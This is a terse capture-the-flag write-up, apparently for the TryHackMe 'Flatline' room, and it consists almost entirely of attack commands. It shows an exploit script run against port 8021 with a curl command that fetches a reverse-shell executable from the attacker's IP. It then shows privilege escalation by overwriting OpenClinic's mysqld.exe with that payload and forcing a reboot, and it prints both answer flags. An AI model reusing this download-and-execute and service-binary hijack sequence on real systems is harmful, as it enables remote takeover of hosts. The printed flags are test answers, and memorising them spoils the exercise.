# Flatline 

> VOiD | Saturday 26 February 2022 03:40:09 AM UTC

My IP : 10.8.253.221
Target IP : 10.10.165.208



## Rustscan
```bash
Open 10.10.165.208:3389
Open 10.10.165.208:8021



```


## PORT 8021 [free]
```bash
python3 exploit.py 10.10.165.208 'curl http://10.8.253.221/win_tryhackme_rev.exe -O rev.exe'

python3 exploit.py 10.10.165.208 'rev.exe'


THM{64bca0843d535fa73eecdc59d27cbe26} 


Directory of C:\projects\openclinic

09/11/2021  07:29    <DIR>          .
09/11/2021  07:29    <DIR>          ..
06/04/2021  22:14               250 configureCountry.bat
01/07/2021  17:20               167 configureLanguage.bat
09/11/2021  07:29    <DIR>          jdk1.8
09/11/2021  07:18           334,840 lua5.1.dll
09/11/2021  07:19    <DIR>          mariadb
07/06/2021  15:58            93,696 OpenClinic GA login.exe
08/05/2020  11:17            27,136 OpenClinicStartServices.exe
01/05/2021  23:45               316 stopOpenClinicHttp.bat
09/11/2021  07:30    <DIR>          tomcat8
09/11/2021  07:29    <DIR>          Uninstall
09/11/2021  07:18         1,389,568 uninstall.exe
               7 File(s)      1,845,973 bytes
               6 Dir(s)  50,510,954,496 bytes free


curl http://10.8.253.221/win_tryhackme_rev.exe -o "C:\projects\openclinic\mariadb\bin\mysqld.exe"

"C:\projects\openclinic\mariadb\bin\mysqld.exe"


Taskkill /IM mysqld.exe /F

copy win_tryhackme_rev.exe "C:\projects\openclinic\mariadb\bin\mysqld.exe"

shutdown /r /t 1

type root.txt
type root.txt
THM{8c8bc5558f0f3f8060d00ca231a9fb5e} 

```